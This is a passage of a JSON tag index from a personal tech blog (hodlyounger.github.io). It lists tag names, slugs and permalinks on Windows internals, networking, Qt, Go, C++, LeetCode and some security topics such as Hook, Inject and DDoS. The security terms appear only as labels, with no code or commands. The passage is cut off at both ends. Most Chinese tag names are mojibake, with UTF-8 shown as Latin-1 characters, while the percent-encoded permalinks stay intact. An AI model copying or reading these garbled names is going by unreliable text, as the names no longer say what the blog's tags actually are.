egistry","slug":"Windows-Registry","permalink":"https://hodlyounger.github.io/tags/Windows-Registry/"},{"name":"Windows/æ§åˆ¶é¢æ¿","slug":"Windows-æ§åˆ¶é¢æ¿","permalink":"https://hodlyounger.github.io/tags/Windows-%E6%8E%A7%E5%88%B6%E9%9D%A2%E6%9D%BF/"},{"name":"Windows/é©±åŠ¨å™¨","slug":"Windows-é©±åŠ¨å™¨","permalink":"https://hodlyounger.github.io/tags/Windows-%E9%A9%B1%E5%8A%A8%E5%99%A8/"},{"name":"ä»¤ç‰Œ","slug":"ä»¤ç‰Œ","permalink":"https://hodlyounger.github.io/tags/%E4%BB%A4%E7%89%8C/"},{"name":"token","slug":"token","permalink":"https://hodlyounger.github.io/tags/token/"},{"name":"Windows/æœåŠ¡","slug":"Windows-æœåŠ¡","permalink":"https://hodlyounger.github.io/tags/Windows-%E6%9C%8D%E5%8A%A1/"},{"name":"windows/AD","slug":"windows-AD","permalink":"https://hodlyounger.github.io/tags/windows-AD/"},{"name":"powershell","slug":"powershell","permalink":"https://hodlyounger.github.io/tags/powershell/"},{"name":"windows/è´¦æˆ·","slug":"windows-è´¦æˆ·","permalink":"https://hodlyounger.github.io/tags/windows-%E8%B4%A6%E6%88%B7/"},{"name":"evtx","slug":"evtx","permalink":"https://hodlyounger.github.io/tags/evtx/"},{"name":"ntdll","slug":"ntdll","permalink":"https://hodlyounger.github.io/tags/ntdll/"},{"name":"windows/ntdll","slug":"windows-ntdll","permalink":"https://hodlyounger.github.io/tags/windows-ntdll/"},{"name":"Windows/WQL","slug":"Windows-WQL","permalink":"https://hodlyounger.github.io/tags/Windows-WQL/"},{"name":"Windows/WMI","slug":"Windows-WMI","permalink":"https://hodlyounger.github.io/tags/Windows-WMI/"},{"name":"Windows/COM","slug":"Windows-COM","permalink":"https://hodlyounger.github.io/tags/Windows-COM/"},{"name":"API","slug":"API","permalink":"https://hodlyounger.github.io/tags/API/"},{"name":"Hook","slug":"Hook","permalink":"https://hodlyounger.github.io/tags/Hook/"},{"name":"Inject","slug":"Inject","permalink":"https://hodlyounger.github.io/tags/Inject/"},{"name":"LDR","slug":"LDR","permalink":"https://hodlyounger.github.io/tags/LDR/"},{"name":"process","slug":"process","permalink":"https://hodlyounger.github.io/tags/process/"},{"name":"thread","slug":"thread","permalink":"https://hodlyounger.github.io/tags/thread/"},{"name":"teb","slug":"teb","permalink":"https://hodlyounger.github.io/tags/teb/"},{"name":"peb","slug":"peb","permalink":"https://hodlyounger.github.io/tags/peb/"},{"name":"æ–‡ä»¶ä¸ç»“æ„ä½“","slug":"æ–‡ä»¶ä¸ç»“æ„ä½“","permalink":"https://hodlyounger.github.io/tags/%E6%96%87%E4%BB%B6%E4%B8%8E%E7%BB%93%E6%9E%84%E4%BD%93/"},{"name":"Windows/AD","slug":"Windows-AD","permalink":"https://hodlyounger.github.io/tags/Windows-AD/"},{"name":"winapi","slug":"winapi","permalink":"https://hodlyounger.github.io/tags/winapi/"},{"name":"linux","slug":"linux","permalink":"https://hodlyounger.github.io/tags/linux/"},{"name":"linux\\é˜²ç«å¢™","slug":"linux-é˜²ç«å¢™","permalink":"https://hodlyounger.github.io/tags/linux-%E9%98%B2%E7%81%AB%E5%A2%99/"},{"name":"Linux","slug":"Linux","permalink":"https://hodlyounger.github.io/tags/Linux/"},{"name":"é˜²ç«å¢™","slug":"é˜²ç«å¢™","permalink":"https://hodlyounger.github.io/tags/%E9%98%B2%E7%81%AB%E5%A2%99/"},{"name":"å¤šçº¿ç¨‹","slug":"å¤šçº¿ç¨‹","permalink":"https://hodlyounger.github.io/tags/%E5%A4%9A%E7%BA%BF%E7%A8%8B/"},{"name":"lib","slug":"lib","permalink":"https://hodlyounger.github.io/tags/lib/"},{"name":"dumpbin","slug":"dumpbin","permalink":"https://hodlyounger.github.io/tags/dumpbin/"},{"name":"å†…æ ¸","slug":"å†…æ ¸","permalink":"https://hodlyounger.github.io/tags/%E5%86%85%E6%A0%B8/"},{"name":"è®¾è®¡æ¨¡å¼","slug":"è®¾è®¡æ¨¡å¼","permalink":"https://hodlyounger.github.io/tags/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/"},{"name":"è®¾è®¡æ¨¡å¼/åˆ›å»ºå‹æ¨¡å¼","slug":"è®¾è®¡æ¨¡å¼-åˆ›å»ºå‹æ¨¡å¼","permalink":"https://hodlyounger.github.io/tags/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F-%E5%88%9B%E5%BB%BA%E5%9E%8B%E6%A8%A1%E5%BC%8F/"},{"name":"CPP","slug":"CPP","permalink":"https://hodlyounger.github.io/tags/CPP/"},{"name":"è®¾è®¡æ¨¡å¼/è¡Œä¸ºå‹æ¨¡å¼","slug":"è®¾è®¡æ¨¡å¼-è¡Œä¸ºå‹æ¨¡å¼","permalink":"https://hodlyounger.github.io/tags/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F-%E8%A1%8C%E4%B8%BA%E5%9E%8B%E6%A8%A1%E5%BC%8F/"},{"name":"è®¾è®¡æ¨¡å¼/ç»“æ„å‹æ¨¡å¼","slug":"è®¾è®¡æ¨¡å¼-ç»“æ„å‹æ¨¡å¼","permalink":"https://hodlyounger.github.io/tags/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F-%E7%BB%93%E6%9E%84%E5%9E%8B%E6%A8%A1%E5%BC%8F/"},{"name":"ä¹¦ç±","slug":"ä¹¦ç±","permalink":"https://hodlyounger.github.io/tags/%E4%B9%A6%E7%B1%8D/"},{"name":"ä¹¦ç±/ã€ŠLinuxæ“ä½œç³»ç»ŸåŸç†å‰–æã€‹","slug":"ä¹¦ç±-ã€ŠLinuxæ“ä½œç³»ç»ŸåŸç†å‰–æã€‹","permalink":"https://hodlyounger.github.io/tags/%E4%B9%A6%E7%B1%8D-%E3%80%8ALinux%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%8E%9F%E7%90%86%E5%89%96%E6%9E%90%E3%80%8B/"},{"name":"æ•°æ®åº“/MySQL","slug":"æ•°æ®åº“-MySQL","permalink":"https://hodlyounger.github.io/tags/%E6%95%B0%E6%8D%AE%E5%BA%93-MySQL/"},{"name":"å·¥å…·æ•´ç†","slug":"å·¥å…·æ•´ç†","permalink":"https://hodlyounger.github.io/tags/%E5%B7%A5%E5%85%B7%E6%95%B4%E7%90%86/"},{"name":"Windows/DACL","slug":"Windows-DACL","permalink":"https://hodlyounger.github.io/tags/Windows-DACL/"},{"name":"Windows/SACL","slug":"Windows-SACL","permalink":"https://hodlyounger.github.io/tags/Windows-SACL/"},{"name":"åŠ å¯†/SHA1","slug":"åŠ å¯†-SHA1","permalink":"https://hodlyounger.github.io/tags/%E5%8A%A0%E5%AF%86-SHA1/"},{"name":"C++","slug":"C","permalink":"https://hodlyounger.github.io/tags/C/"},{"name":"windows/UAC","slug":"windows-UAC","permalink":"https://hodlyounger.github.io/tags/windows-UAC/"},{"name":"windows/appinfo","slug":"windows-appinfo","permalink":"https://hodlyounger.github.io/tags/windows-appinfo/"},{"name":"libpq","slug":"libpq","permalink":"https://hodlyounger.github.io/tags/libpq/"},{"name":"è°ƒè¯•æŠ€æœ¯","slug":"è°ƒè¯•æŠ€æœ¯","permalink":"https://hodlyounger.github.io/tags/%E8%B0%83%E8%AF%95%E6%8A%80%E6%9C%AF/"},{"name":"å¯„å­˜å™¨","slug":"å¯„å­˜å™¨","permalink":"https://hodlyounger.github.io/tags/%E5%AF%84%E5%AD%98%E5%99%A8/"},{"name":"Graphviz","slug":"Graphviz","permalink":"https://hodlyounger.github.io/tags/Graphviz/"},{"name":"ç½‘ç»œç¼–ç¨‹/è¯ä¹¦","slug":"ç½‘ç»œç¼–ç¨‹-è¯ä¹¦","permalink":"https://hodlyounger.github.io/tags/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B-%E8%AF%81%E4%B9%A6/"},{"name":"PEM","slug":"PEM","permalink":"https://hodlyounger.github.io/tags/PEM/"},{"name":"å£°ç½‘","slug":"å£°ç½‘","permalink":"https://hodlyounger.github.io/tags/%E5%A3%B0%E7%BD%91/"},{"name":"æ¯”èµ›","slug":"æ¯”èµ›","permalink":"https://hodlyounger.github.io/tags/%E6%AF%94%E8%B5%9B/"},{"name":"RTC","slug":"RTC","permalink":"https://hodlyounger.github.io/tags/RTC/"},{"name":"éŸ³è§†é¢‘","slug":"éŸ³è§†é¢‘","permalink":"https://hodlyounger.github.io/tags/%E9%9F%B3%E8%A7%86%E9%A2%91/"},{"name":"å‰ç«¯","slug":"å‰ç«¯","permalink":"https://hodlyounger.github.io/tags/%E5%89%8D%E7%AB%AF/"},{"name":"å›¾ç‰‡","slug":"å›¾ç‰‡","permalink":"https://hodlyounger.github.io/tags/%E5%9B%BE%E7%89%87/"},{"name":"æ ¼å¼","slug":"æ ¼å¼","permalink":"https://hodlyounger.github.io/tags/%E6%A0%BC%E5%BC%8F/"},{"name":"Qt","slug":"Qt","permalink":"https://hodlyounger.github.io/tags/Qt/"},{"name":"osquery","slug":"osquery","permalink":"https://hodlyounger.github.io/tags/osquery/"},{"name":"readme","slug":"readme","permalink":"https://hodlyounger.github.io/tags/readme/"},{"name":"OpenSSL","slug":"OpenSSL","permalink":"https://hodlyounger.github.io/tags/OpenSSL/"},{"name":"åŠ å¯†/SM3","slug":"åŠ å¯†-SM3","permalink":"https://hodlyounger.github.io/tags/%E5%8A%A0%E5%AF%86-SM3/"},{"name":"LeetCode/æ’åº","slug":"LeetCode-æ’åº","permalink":"https://hodlyounger.github.io/tags/LeetCode-%E6%8E%92%E5%BA%8F/"},{"name":"LeetCode/å¿«é€Ÿæ’åº","slug":"LeetCode-å¿«é€Ÿæ’åº","permalink":"https://hodlyounger.github.io/tags/LeetCode-%E5%BF%AB%E9%80%9F%E6%8E%92%E5%BA%8F/"},{"name":"LeetCode","slug":"LeetCode","permalink":"https://hodlyounger.github.io/tags/LeetCode/"},{"name":"LeetCode/è´ªå¿ƒ","slug":"LeetCode-è´ªå¿ƒ","permalink":"https://hodlyounger.github.io/tags/LeetCode-%E8%B4%AA%E5%BF%83/"},{"name":"Code/Go","slug":"Code-Go","permalink":"https://hodlyounger.github.io/tags/Code-Go/"},{"name":"Code/CPP","slug":"Code-CPP","permalink":"https://hodlyounger.github.io/tags/Code-CPP/"},{"name":"LeetCode/çŸ©é˜µ","slug":"LeetCode-çŸ©é˜µ","permalink":"https://hodlyounger.github.io/tags/LeetCode-%E7%9F%A9%E9%98%B5/"},{"name":"LeetCode/æ¨¡æ‹Ÿ","slug":"LeetCode-æ¨¡æ‹Ÿ","permalink":"https://hodlyounger.github.io/tags/LeetCode-%E6%A8%A1%E6%8B%9F/"},{"name":"LeetCode/æ•°æ®","slug":"LeetCode-æ•°æ®","permalink":"https://hodlyounger.github.io/tags/LeetCode-%E6%95%B0%E6%8D%AE/"},{"name":"LeetCode/å“ˆå¸Œè¡¨","slug":"LeetCode-å“ˆå¸Œè¡¨","permalink":"https://hodlyounger.github.io/tags/LeetCode-%E5%93%88%E5%B8%8C%E8%A1%A8/"},{"name":"Code/C","slug":"Code-C","permalink":"https://hodlyounger.github.io/tags/Code-C/"},{"name":"LeetCode/æ•°ç»„","slug":"LeetCode-æ•°ç»„","permalink":"https://hodlyounger.github.io/tags/LeetCode-%E6%95%B0%E7%BB%84/"},{"name":"LeetCode/æ·±åº¦ä¼˜å…ˆæœç´¢","slug":"LeetCode-æ·±åº¦ä¼˜å…ˆæœç´¢","permalink":"https://hodlyounger.github.io/tags/LeetCode-%E6%B7%B1%E5%BA%A6%E4%BC%98%E5%85%88%E6%90%9C%E7%B4%A2/"},{"name":"LeetCode/åŠ¨æ€è§„åˆ’","slug":"LeetCode-åŠ¨æ€è§„åˆ’","permalink":"https://hodlyounger.github.io/tags/LeetCode-%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/"},{"name":"ç½‘ç»œå®‰å…¨/DDos","slug":"ç½‘ç»œå®‰å…¨-DDos","permalink":"https://hodlyounger.github.io/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8-DDos/"},{"name":"DDoS","slug":"DDoS","permalink":"https://hodlyounger.github.io/tags/DDoS/"},{"name":"markdown","slug":"markdown","permalink":"https://hodlyounger.github.io/tags/markdown/"},{"name":"å¿«æ·é”®","slug":"å¿«æ·é”®","permalink":"https://hodlyounger.github.io/tags/%E5%BF%AB%E6%8D%B7%E9%94%AE/"},{"name":"VA","slug":"VA","permalink":"https://hodlyounger.github.io/tags/VA/"},{"name":"CSS","slug":"CSS","permalink":"https://hodlyounger.github.io/tags/CSS/"},{"name":"æ‰‹å†Œ/å˜é‡","slug":"æ‰‹å†Œ-å˜é‡","permalink":"https://hodlyounger.github.io/tags/%E6%89%8B%E5%86%8C-%E5%8F%98%E9%87%8F/"},{"name":"è‡ªå®šä¹‰","slug":"è‡ªå®šä¹‰","permalink":"https://hodlyounger.github.io/tags/%E8%87%AA%E5%AE%9A%E4%B9%89/"},{"name":"Config","slug":"Config","permalink":"https://hodlyounger.github.io/tags/Config/"},{"name":"é…ç½®","slug":"é…ç½®","permalink":"https://hodlyounger.github.io/tags/%E9%85%8D%E7%BD%AE/"},{"name":"themes","slug":"themes","permalink":"https://hodlyounger.github.io/tags/themes/"},{"name":"typora","slug":"typora","permalink":"https://hodlyounger.github.io/tags/typora/"},{"name":"Stellar","slug":"Stellar","permalink":"https://hodlyounger.github.io/tags/Stellar/"},{"name":"hexo","slug":"hexo","permalink":"https://hodlyounger.github.io/tags/hexo/"},{"name":"code","slug":"code","permalink":"https://hodlyounger.github.io/tags/code/"},{"name":"UML","slug":"UML","permalink":"https://hodlyounger.github.io/tags/UML/"},{"name":"emoji","slug":"emoji","permalink":"https://hodlyounger.github.io/tags/emoji/"},{"name":"æ ·å¼","slug":"æ ·å¼","permalink":"https://hodlyounger.github.io/tags/%E6%A0%B7%E5%BC%8F/"},{"name":"Readme","slug":"Readme","permalink":"https://hodlyounger.github.io/tags/Readme/"},{"name":"Git","slug":"Git","permalink":"https://hodlyounger.github.io/tags/Git/"},{"name":"Issue","slug":"Issue","permalink":"https://hodlyounger.github.io/tags/Issue/"},{"name":"Git/å¤šè´¦å·","slug":"Git-å¤šè´¦å·","permalink":"https://hodlyounger.github.io/tags/Git-%E5%A4%9A%E8%B4%A6%E5%8F%B7/"},{"name":"git","slug":"git","permalink":"https://hodlyounger.github.io/tags/git/"},{"name":"è¯­å½•","slug":"è¯­å½•","permalink":"https://hodlyounger.github.io/tags/%E8%AF%AD%E5%BD%95/"},{"name":"LOL","slug":"LOL","permalink":"https://hodlyounger.github.io/tags/LOL/"},{"name":"é€ŸæŸ¥","slug":"é€ŸæŸ¥","permalink":"https://hodlyounger.github.io/tags/%E9%80%9F%E6%9F%A5/"},{"name":"ä¹¦ç±/ã€Šæ·±å…¥ç†è§£Windowsæ“ä½œç³»ç»Ÿã€‹","slug":"ä¹¦ç±-ã€Šæ·±å…¥ç†è§£Windowsæ“ä½œç³»ç»Ÿã€‹","permalink":"https://hodlyounger.github.io/tags/%E4%B9%A6%E7%B1%8D-%E3%80%8A%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Windows%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E3%80%8B/"},{"name":"è‹±è¯­","slug":"è‹±è¯­","permalink":"https://hodlyounger.github.io/tags/%E8%8B%B1%E8%AF%AD/"},{"name":"curl","slug":"curl","permalink":"https://hodlyounger.github.io/tags/curl/"},{"name":"https","slug":"https","permalink":"https://hodlyounger.github.io/tags/https/"},{"name":"å¯¹ç§°å¯†é’¥","slug":"å¯¹ç§°å¯†é’¥","permalink":"https://hodlyounger.github.io/tags/%E5%AF%B9%E7%A7%B0%E5%AF%86%E9%92%A5/"},{"name":"å…¬é’¥","slug":"å…¬é’¥","permalink":"https://hodlyounger.github.io/tags/%E5%85%AC%E9%92%A5/"},{"name":"ssl","slug":"ssl","permalink":"https://hodlyounger.github.io/tags/ssl/"},{"name":"tls","slug":"tls","permalink":"https://hodlyounger.github.io/tags/tls/"},{"name":"ç³»ç»Ÿå®‰å…¨","slug":"ç³»ç»Ÿå®‰å…¨","permalink":"https://hodlyounger.github.io/tags/%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8/"},{"name":"æ•°å­—ç­¾åä¸é‰´åˆ«","slug":"æ•°å­—ç­¾åä¸é‰´åˆ«","permalink":"https://hodlyounger.github.io/tags/%E6%95%B0%E5%AD%97%E7%AD%BE%E5%90%8D%E4%B8%8E%E9%89%B4%E5%88%AB/"},{"name":"å¯†é’¥ç®¡ç†","slug":"å¯†é’¥ç®¡ç†","permalink":"https://hodlyounger.github.io/tags/%E5%AF%86%E9%92%A5%E7%AE%A1%E7%90%86/"},{"name":"ä¹¦ç±/ã€ŠWindowsæ ¸å¿ƒç¼–ç¨‹ã€‹","slug":"ä¹¦ç±-ã€ŠWindowsæ ¸å¿ƒç¼–ç¨‹ã€‹","permalink":"https://hodlyounger.github.io/tags/%E4%B9%A6%E7%B1%8D-%E3%80%8AWindows%E6%A0%B8%E5%BF%83%E7%BC%96%E7%A8%8B%E3%80%8B/"},{"name":"è§„èŒƒ","slug":"è§„èŒƒ","permalink":"https://hodlyounger.github.io/tags/%E8%A7%84%E8%8C%83/"},{"name":"ä¹¦ç±/ã€ŠLinuxå‘½ä»¤è¡Œä¸shellè„šæœ¬ç¼–ç¨‹å¤§å…¨ã€‹","slug":"ä¹¦ç±-ã€ŠLinuxå‘½ä»¤è¡Œä¸shellè„šæœ¬ç¼–ç¨‹å¤§å…¨ã€‹","permalink":"https://hodlyounger.github.io/tags/%E4%B9%A6%E7%B1%8D-%E3%80%8ALinux%E5%91%BD%E4%BB%A4%E8%A1%8C%E4%B8%8Eshell%E8%84%9A%E6%9C%AC%E7%BC%96%E7%A8%8B%E5%A4%A7%E5%85%A8%E3%80%8B/"},{"name":"CPP/effectivecpp","slug":"CPP-effectivecpp","permalink":"https://hodlyounger.github.io/tags/CPP-effectivecpp/"},{"name":"cpp/effectivecpp","slug":"cpp-effectivecpp","permalink":"https://hodlyounger.github.io/tags/cpp-effectivecpp/"},{"name":"ä¹¦ç±/ã€ŠCPP-primer-plusã€‹","slug":"ä¹¦ç±-ã€ŠCPP-primer-plusã€‹","permalink":"https://hodlyounger.github.io/tags/%E4%B9%A6%E7%B1%8D-%E3%80%8ACPP-primer-plus%E3%80%8B/"},{"name":"cpp/å‹å…ƒ","slug":"cpp-å‹å…ƒ","permalink":"https://hodlyounger.github.io/tags/cpp-%E5%8F%8B%E5%85%83/"},{"name":"friend","slug":"friend","permalink":"https://hodlyounger.github.io/tags/friend/"},{"name":"CPP/enum","slug":"CPP-enum","permalink":"https://hodlyounger.github.io/tags/CPP-enum/"},{"name":"Opensource","slug":"Opensource","permalink":"https://hodlyounger.github.io/tags/Opensource/"},{"name":"libevent","slug":"libevent","permalink":"https://hodlyounger.github.io/tags/libevent/"},{"name":"json","slug":"json","permalink":"https://hodlyounger.github.io/tags/json/"},{"name":"èµ„æº","slug":"èµ„æº","permalink":"https://hodlyounger.github.io/tags/%E8%B5%84%E6%BA%90/"},{"name":"Unsplash","slug":"Unsplash","permalink":"https://hodlyounger.github.io/tags/Unsplash/"},{"name":"Windows/CMD/netsh","slug":"Windows-CMD-netsh","permalink":"https://hodlyounger.github.io/tags/Windows-CMD-netsh/"},{"name":"æŠ“åŒ…","slug":"æŠ“åŒ…","permalink":"https://hodlyounger.github.io/tags/%E6%8A%93%E5%8C%85/"},{"name":"IP","slug":"IP","permalink":"https://hodlyounger.github.io/tags/IP/"},{"name":"ç½‘ç»œ","slug":"ç½‘ç»œ","permalink":"https://hodlyounger.github.io/tags/%E7%BD%91%E7%BB%9C/"},{"name":"socket","slug":"socket","permalink":"https://hodlyounger.github.io/tags/socket/"},{"name":"tcp","slug":"tcp","permalink":"https://hodlyounger.github.io/tags/tcp/"},{"name":"Socket","slug":"Socket","permalink":"https://hodlyounger.github.io/tags/Socket/"},{"name":"åè®®","slug":"åè®®","permalink":"https://hodlyounger.github.io/tags/%E5%8D%8F%E8%AE%AE/"},{"name":"IOå¤ç”¨","slug":"IOå¤ç”¨","permalink":"https://hodlyounger.github.io/tags/IO%E5%A4%8D%E7%94%A8/"},{"name":"IPv6","slug":"IPv6","permalink":"https://hodlyounger.github.io/tags/IPv6/"},{"name":"DNS","slug":"DNS","permalink":"https://hodlyounger.github.io/tags/DNS/"},{"name":"ç¼“å­˜","slug":"ç¼“å­˜","permalink":"https://hodlyounger.github.io/tags/%E7%BC%93%E5%AD%98/"},{"name":"Windows/åŸŸ/åŸŸå","slug":"Windows-åŸŸ-åŸŸå","permalink":"https://hodlyounger.github.io/tags/Windows-%E5%9F%9F-%E5%9F%9F%E5%90%8D/"},{"name":"UDP","slug":"UDP","permalink":"https://hodlyounger.github.io/tags/UDP/"},{"name":"TCP","slug":"TCP","permalink":"https://hodlyounger.github.io/tags/TCP/"},{"name":"Curl","slug":"Curl","permalink":"https://hodlyounger.github.io/tags/Curl/"},{"name":"HTTP","slug":"HTTP","permalink":"https://hodlyounger.github.io/tags/HTTP/"},{"name":"regex","slug":"regex","permalink":"https://hodlyounger.github.io/tags/regex/"},{"name":"æ­£åˆ™è¡¨è¾¾å¼","slug":"æ­£åˆ™è¡¨è¾¾å¼","permalink":"https://hodlyounger.github.io/tags/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/"},{"name":"æ•°æ®åº“","slug":"æ•°æ®åº“","permalink":"https://hodlyounger.github.io/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/"},{"name":"åŠ å¯†","slug":"åŠ å¯†","permalink":"https://hodlyounger.github.io/tags/%E5%8A%A0%E5%AF%86/"},{"name":"Database","slug":"Database","permalink":"https://hodlyounger.github.io/tags/Database/"},{"name":"Linux/Ubuntu","slug":"Linux-Ubuntu","permalink":"https://hodlyounger.github.io/tags/Linux-Ubuntu/"},{"name":"navicat","slug":"navicat","permalink":"https://hodlyounger.github.io/tags/navicat/"},{"name":"éŸ³é¢‘","slug":"éŸ³é¢‘","permalink":"https://hodlyounger.github.io/tags/%E9%9F%B3%E9%A2%91/"},{"name":"è„šæœ¬","slug":"è„šæœ¬","permalink":"https://hodlyounger.github.io/tags/%E8%84%9A%E6%9C%AC/"},{"name":"code/TypeScript","slug":"code-TypeScript","permalink":"https://hodlyounger.github.io/tags/code-TypeScript/"},{"name":"fastboard","slug":"fastboard","permalink":"https://hodlyounger.github.io/tags/fastboard/"},{"name":"é”®ç›˜","slug":"é”®ç›˜","permalink":"https://hodlyounger.github.io/tags/%E9%94%AE%E7%9B%98/"},{"name":"è¿›åº¦æ¡","slug":"è¿›åº¦æ¡","permalink":"https://hodlyounger.github.io/tags/%E8%BF%9B%E5%BA%A6%E6%9D%A1/"},{"name":"åœ†","slug":"åœ†","permalink":"https://hodlyounger.github.io/tags/%E5%9C%86/"},{"name":"Qt/åŠ¨ç”»","slug":"Qt-åŠ¨ç”»","permalink":"https://hodlyounger.github.io/tags/Qt-%E5%8A%A8%E7%94%BB/"},{"name":"Windows/ä»»åŠ¡æ ","slug":"Windows-ä»»åŠ¡æ ","permalink":"https://hodlyounger.github.io/tags/Windows-%E4%BB%BB%E5%8A%A1%E6%A0%8F/"},{"name":"Qt/QStackWidget","slug":"Qt-QStackWidget","permalink":"https://hodlyounger.github.io/tags/Qt-QStackWidget/"},{"name":"å†…å­˜","slug":"å†…å­˜","permalink":"https://hodlyounger.github.io/tags/%E5%86%85%E5%AD%98/"},{"name":"new","slug":"new","permalink":"https://hodlyounger.github.io/tags/new/"},{"name":"æ•°æ®åº“/SQLite3","slug":"æ•°æ®åº“-SQLite3","permalink":"https://hodlyounger.github.io/tags/%E6%95%B0%E6%8D%AE%E5%BA%93-SQLite3/"},{"name":"å¼€æº","slug":"å¼€æº","permalink":"https://hodlyounger.github.io/tags/%E5%BC%80%E6%BA%90/"},{"name":"æ‹–æ‹½","slug":"æ‹–æ‹½","permalink":"https://hodlyounger.github.io/tags/%E6%8B%96%E6%8B%BD/"},{"name":"å¸ƒå±€","slug":"å¸ƒå±€","permalink":"https://hodlyounger.github.io/tags/%E5%B8%83%E5%B1%80/"},{"name":"æ°”æ³¡","slug":"æ°”æ³¡","permalink":"https://hodlyounger.github.io/tags/%E6%B0%94%E6%B3%A1/"},{"name":"æˆªå›¾","slug":"æˆªå›¾","permalink":"https://hodlyounger.github.io/tags/%E6%88%AA%E5%9B%BE/"},{"name":"æ—‹è½¬","slug":"æ—‹è½¬","permalink":"https://hodlyounger.github.io/tags/%E6%97%8B%E8%BD%AC/"},{"name":"Qt/QNetWork","slug":"Qt-QNetWork","permalink":"https://hodlyounger.github.io/tags/Qt-QNetWork/"},{"name":"Qt/QNetworkRequest","slug":"Qt-QNetworkRequest","permalink":"https://hodlyounger.github.io/tags/Qt-QNetworkRequest/"},{"name":"å­—ç¬¦ä¸²","slug":"å­—ç¬¦ä¸²","permalink":"https://hodlyounger.github.io/tags/%E5%AD%97%E7%AC%A6%E4%B8%B2/"},{"name":"Windows/cmd","slug":"Windows-cmd","permalink":"https://hodlyounger.github.io/tags/Windows-cmd/"},{"name":"è‡ªå®šä¹‰æ§ä»¶","slug":"è‡ªå®šä¹‰æ§ä»¶","permalink":"https://hodlyounger.github.io/tags/%E8%87%AA%E5%AE%9A%E4%B9%89%E6%8E%A7%E4%BB%B6/"},{"name":"é€šçŸ¥","slug":"é€šçŸ¥","permalink":"https://hodlyounger.github.io/tags/%E9%80%9A%E7%9F%A5/"},{"name":"css","slug":"css","permalink":"https://hodlyounger.github.io/tags/css/"},{"name":"ç¼©æ”¾","slug":"ç¼©æ”¾","permalink":"https://hodlyounger.github.io/tags/%E7%BC%A9%E6%94%BE/"},{"name":"Qt/QWebEngineView","slug":"Qt-QWebEngineView","permalink":"https://hodlyounger.github.io/tags/Qt-QWebEngineView/"},{"name":"Qt/QTableWidget","slug":"Qt-QTableWidget","permalink":"https://hodlyounger.github.io/tags/Qt-QTableWidget/"},{"name":"Qt/QListWidget","slug":"Qt-QListWidget","permalink":"https://hodlyounger.github.io/tags/Qt-QListWidget/"},{"name":"Qt/QLineEdit","slug":"Qt-QLineEdit","permalink":"https://hodlyounger.github.io/tags/Qt-QLineEdit/"},{"name":"Code/python","slug":"Code-python","permalink":"https://hodlyounger.github.io/tags/Code-python/"},{"name":"http","slug":"http","permalink":"https://hodlyounger.github.io/tags/http/"},{"name":"pdm","slug":"pdm","permalink":"https://hodlyounger.github.io/tags/pdm/"},{"name":"Code/Python","slug":"Code-Python","permalink":"https://hodlyounger.github.io/tags/Code-Python/"},{"name":"Demo","slug":"Demo","permalink":"https://hodlyounger.github.io/tags/Demo/"},{"name":"IPC","slug":"IPC","permalink":"https://hodlyounger.github.io/tags/IPC/"},{"name":"Windows/Pipe","slug":"Windows-Pipe","permalink":"https://hodlyounger.github.io/tags/Windows-Pipe/"},{"name":"Pipe","slug":"Pipe","permalink":"https://hodlyounger.github.io/tags/Pipe/"},{"name":"Go","slug":"Go","permalink":"https://hodlyounger.github.io/tags/Go/"},{"name":"Wails","slug":"Wails","permalink":"https://hodlyounger.github.io/tags/Wails/"},{"name":"Goç®€æ˜æ‰‹å†Œ","slug":"Goç®€æ˜æ‰‹å†Œ","permalink":"https://hodlyounger.github.io/tags/Go%E7%AE%80%E6%98%8E%E6%89%8B%E5%86%8C/"},{"name":"æ‰‹å†Œ/Goç®€æ˜æ‰‹å†Œ","slug":"æ‰‹å†Œ-Goç®€æ˜æ‰‹å†Œ","permalink":"https://hodlyounger.github.io/tags/%E6%89%8B%E5%86%8C-Go%E7%AE%80%E6%98%8E%E6%89%8B%E5%86%8C/"},{"name":"Go ç®€æ˜æ‰‹å†Œ","slug":"Go-ç®€æ˜æ‰‹å†Œ","permalink":"https://hodlyounger.github.io/tags/Go-%E7%AE%80%E6%98%8E%E6%89%8B%E5%86%8C/"},{"name":"Code","slug":"Code","permalink":"https://hodlyounger.github.io/tags/Code/"},{"name":"GO","slug":"GO","permalink":"https://hodlyounger.github.io/tags/GO/"},{"name":"é¢å‘å¯¹è±¡ç¼–ç¨‹","slug":"é¢å‘å¯¹è±¡ç¼–ç¨‹","permalink":"https://hodlyounger.github.io/tags/%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E7%BC%96%E7%A8%8B/"},{"name":"æ‰‹å†Œ/Gp","slug":"æ‰‹å†Œ-Gp","permalink":"https://hodlyounger.github.io/tags/%E6%89%8B%E5%86%8C-Gp/"},{"name":"go","slug":"go","permalink":"https://hodlyounger.github.io/tags/go/"},{"name":"package","slug":"package","permalink":"https://hodlyounger.github.io/tags/package/"},{"name":"Code\\Go","slug":"Code-Go","permalink":"https://hodlyounger.github.io/tags/Code-Go/"},{"name":"PEæ–‡ä»¶","slug":"PEæ–‡ä»¶","permalink":"https://hodlyounger.github.io/tags/PE%E6%96%87%E4%BB%B6/"},{"name":"duilib","slug":"duilib","permalink":"https://hodlyounger.github.io/tags/duilib/"},{"name":"mutex","slug":"mutex","permalink":"https://hodlyounger.github.io/tags/mutex/"},{"name":"CPP/æ—¶é—´","slug":"CPP-æ—¶é—´","permalink":"https://hodlyounger.github.io/tags/CPP-%E6%97%B6%E9%97%B4/"},{"name":"Code/å®å®šä¹‰","slug":"Code-å®å®šä¹‰","permalink":"https://hodlyounger.github.io/tags/Code-%E5%AE%8F%E5%AE%9A%E4%B9%89/"},{"name":"å¼‚å¸¸","slug":"å¼‚å¸¸","permalink":"https://hodlyounger.github.io/tags/%E5%BC%82%E5%B8%B8/"},{"name":"CPP/future","slug":"CPP-future","permalink":